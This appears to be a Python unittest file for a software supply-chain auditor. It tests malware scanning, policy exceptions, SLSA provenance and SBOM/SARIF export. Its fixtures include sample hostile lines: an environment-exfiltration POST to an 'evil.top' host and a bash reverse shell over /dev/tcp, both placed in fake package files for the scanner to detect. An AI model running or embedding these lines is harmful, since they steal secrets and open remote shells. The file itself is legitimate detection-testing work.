import base64
import io
import json
import tarfile
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

from auditor.malware_analysis import scan_malware
from auditor.policy_engine import append_policy_audit_log, evaluate_policy, load_policy, validate_policy
from auditor.provenance import validate_slsa_attestation, check_provenance
from auditor.sarif import export_sarif
from auditor.sbom import export_cyclonedx
from auditor.version import __version__
from auditor.scorer import score_package


class V7SecurityDepthTests(unittest.TestCase):
    def _tar_bytes(self, files):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            for name, content in files.items():
                data = content.encode("utf-8") if isinstance(content, str) else content
                info = tarfile.TarInfo(name)
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
        return buf.getvalue()

    def test_malware_analysis_detects_secret_ioc_and_behavior(self):
        raw = self._tar_bytes({
            "package/setup.py": "AWS_SECRET_ACCESS_KEY='x'\nAKIAABCDEFGHIJKLMNOP\nrequests.post('https://evil.top/hook', data=os.environ)\n",
            "package/loader.py": "import os\nos.system('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')\n",
        })
        with patch("auditor.malware_analysis._registry_url", return_value="https://example.test/pkg.tgz"), patch("auditor.malware_analysis.fetch_bytes", return_value=(raw, None)):
            result = scan_malware("evilpkg", "pip")
        categories = {f["category"] for f in result["findings"]}
        self.assertIn("Secret exposure", categories)
        self.assertIn("Malware behavior", categories)
        self.assertTrue(result["iocs"])

    def test_malware_analysis_flags_native_binary(self):
        raw = self._tar_bytes({"package/native.pyd": bytes(range(256)) * 400})
        with patch("auditor.malware_analysis._registry_url", return_value="https://example.test/pkg.tgz"), patch("auditor.malware_analysis.fetch_bytes", return_value=(raw, None)):
            result = scan_malware("nativepkg", "pip")
        self.assertTrue(result["binary_files"])
        self.assertTrue(any(f["category"] == "Binary inspection" for f in result["findings"]))

    def test_policy_schema_rejects_bad_exception(self):
        policy = {"schema": "supply-chain-auditor-policy-v2", "default_action": "allow", "exceptions": [{"package": "x"}], "rules": []}
        errors = validate_policy(policy)
        self.assertTrue(any("approved_by" in e for e in errors))
        self.assertTrue(any("ticket" in e for e in errors))

    def test_policy_exception_allows_temporary_approved_risk(self):
        report = SimpleNamespace(package="legacy", ecosystem="pip", risk_score=90, risk_level="CRITICAL", signals=[], license=None, dependency_policy={"source_type": "direct"})
        policy = {
            "schema": "supply-chain-auditor-policy-v2",
            "default_action": "allow",
            "allowlist": [],
            "blocklist": [],
            "governance": {"require_exception_expiry": True, "require_exception_approver": True, "require_exception_ticket": True},
            "exceptions": [{"id": "TEMP-1", "package": "legacy", "ecosystem": "pip", "expires": "2099-01-01T00:00:00+00:00", "approved_by": "sec@example.com", "ticket": "SEC-1", "justification": "temporary"}],
            "rules": [{"id": "block-critical", "when": {"risk_score_gte": 85}, "action": "block", "message": "blocked"}],
        }
        result = evaluate_policy([report], policy)
        self.assertEqual(result["summary"]["allow"], 1)
        self.assertEqual(result["decisions"][0]["exception"]["id"], "TEMP-1")

    def test_policy_audit_log_appends_jsonl(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "policy-audit.jsonl"
            append_policy_audit_log({"summary": {"allow": 1}}, path)
            line = path.read_text().strip()
            self.assertEqual(json.loads(line)["schema"], "supply-chain-auditor-policy-audit-log-v1")

    def test_slsa_attestation_validation(self):
        statement = {
            "_type": "https://in-toto.io/Statement/v1",
            "predicateType": "https://slsa.dev/provenance/v1",
            "predicate": {
                "builder": {"id": "https://github.com/actions/runner"},
                "invocation": {"configSource": {"uri": "github.com/acme/repo"}},
            },
        }
        with tempfile.TemporaryDirectory() as tmp:
            att = Path(tmp) / "att.intoto.jsonl"
            att.write_text(json.dumps(statement), encoding="utf-8")
            policy = {"slsa": {"attestation_file": str(att), "expected_builder_id": "actions/runner", "expected_source_repository": "github.com/acme/repo"}}
            result = validate_slsa_attestation(policy)
        self.assertTrue(result["ok"])

    def test_check_provenance_records_required_missing_slsa(self):
        with tempfile.TemporaryDirectory() as tmp:
            policy_path = Path(tmp) / "prov.json"
            policy_path.write_text(json.dumps({"schema": "supply-chain-auditor-provenance-policy-v1", "slsa": {"required": True}}), encoding="utf-8")
            with patch("auditor.provenance._registry_pypi_files", return_value=[]):
                result = check_provenance("pkg", "pip", None, {}, provenance_policy_path=str(policy_path))
        self.assertFalse(result["slsa_verified"])
        self.assertTrue(any("required" in f.lower() for f in result["flags"]))

    def test_exporters_use_shared_version(self):
        report = SimpleNamespace(package="pkg", ecosystem="pip", version="1.0", risk_score=0, risk_level="SAFE", recommendation="ok", signals=[], license=None, dependency_policy=None, provenance=None)
        with tempfile.TemporaryDirectory() as tmp:
            sarif = Path(tmp) / "r.sarif"
            sbom = Path(tmp) / "s.json"
            export_sarif([report], str(sarif))
            export_cyclonedx([report], str(sbom))
            self.assertEqual(json.loads(sarif.read_text())["runs"][0]["tool"]["driver"]["version"], __version__)
            self.assertEqual(json.loads(sbom.read_text())["metadata"]["tools"][0]["version"], __version__)

    def test_v7_1_examples_and_docs_do_not_score_as_critical_malware(self):
        raw = self._tar_bytes({
            "package/tests/test_tokens.py": "# fake documentation token\nAKIAABCDEFGHIJKLMNOP\n",
            "package/examples/example.py": "print(\"https://callback.evil.top/path\")\n",
        })
        with patch("auditor.malware_analysis._registry_url", return_value="https://example.test/pkg.tgz"), patch("auditor.malware_analysis.fetch_bytes", return_value=(raw, None)):
            malware = scan_malware("legitpkg", "pip")
        self.assertTrue(malware["findings"])
        self.assertTrue(all(not f.get("scoreable") for f in malware["findings"]))
        report = score_package(
            {"is_suspicious": False},
            {"name": "legitpkg", "ecosystem": "pip", "exists": True, "latest_version": "1.0.0", "maintainers": ["a", "b"], "classifiers": ["x"], "version_count": 4, "repository": "https://github.com/acme/legitpkg"},
            {"findings": []},
            {"vulns": []},
            {},
            {},
            malware_result=malware,
        )
        self.assertEqual(report.risk_score, 0)

    def test_v7_1_plain_exec_without_obfuscation_is_not_malware(self):
        raw = self._tar_bytes({"package/module.py": "def run(code):\n    exec(code)\n"})
        with patch("auditor.malware_analysis._registry_url", return_value="https://example.test/pkg.tgz"), patch("auditor.malware_analysis.fetch_bytes", return_value=(raw, None)):
            malware = scan_malware("legitpkg", "pip")
        self.assertFalse(any(f["description"] == "obfuscated dynamic execution chain" for f in malware["findings"]))

    def test_v7_1_normal_native_binary_is_context_not_critical(self):
        raw = self._tar_bytes({"package/native.pyd": b"regular-native-binary" * 2000})
        with patch("auditor.malware_analysis._registry_url", return_value="https://example.test/pkg.tgz"), patch("auditor.malware_analysis.fetch_bytes", return_value=(raw, None)):
            malware = scan_malware("nativepkg", "pip")
        self.assertTrue(any(f["category"] == "Binary inspection" for f in malware["findings"]))
        self.assertTrue(all(f.get("severity") in {"INFO", "MEDIUM"} for f in malware["findings"]))


if __name__ == "__main__":
    unittest.main()

class V72FalsePositiveControlsTests(unittest.TestCase):
    def _base_meta(self, name="flask"):
        return {
            "name": name,
            "ecosystem": "pip",
            "exists": True,
            "latest_version": "1.0.0",
            "maintainers": ["a", "b"],
            "classifiers": ["Programming Language :: Python :: 3"],
            "version_count": 20,
            "repository": f"https://github.com/example/{name}",
            "weekly_downloads": 2_000_000,
        }

    def test_v7_2_repeated_malware_keywords_do_not_make_reputable_package_critical(self):
        malware = {
            "findings": [
                {"category": "Malware behavior", "description": "credential exfiltration intent", "severity": "CRITICAL", "confidence": "HIGH", "scoreable": True, "file": "package/module.py", "line": i, "snippet": "upload token"}
                for i in range(1, 25)
            ]
        }
        report = score_package(
            {"is_suspicious": False},
            self._base_meta("flask"),
            {"findings": []},
            {"vulns": []},
            {"repository_health": {"stars": 60000}},
            {},
            malware_result=malware,
        )
        self.assertNotEqual(report.risk_level, "CRITICAL")
        self.assertLess(report.risk_score, 35)

    def test_v7_2_correlated_malware_still_scores_non_reputable_package(self):
        malware = {
            "findings": [
                {"category": "Secret exposure", "description": "GitHub personal access token", "severity": "CRITICAL", "confidence": "HIGH", "scoreable": True, "file": "package/main.py", "line": 1, "snippet": "ghp_" + "A" * 40},
                {"category": "Malware behavior", "description": "reverse shell or PowerShell loader", "severity": "CRITICAL", "confidence": "HIGH", "scoreable": True, "file": "package/main.py", "line": 2, "snippet": "bash -i"},
            ]
        }
        report = score_package(
            {"is_suspicious": False},
            self._base_meta("unknown-newpkg") | {"weekly_downloads": 0, "version_count": 1, "repository": None},
            {"findings": []},
            {"vulns": []},
            {},
            {},
            malware_result=malware,
        )
        self.assertGreaterEqual(report.risk_score, 60)

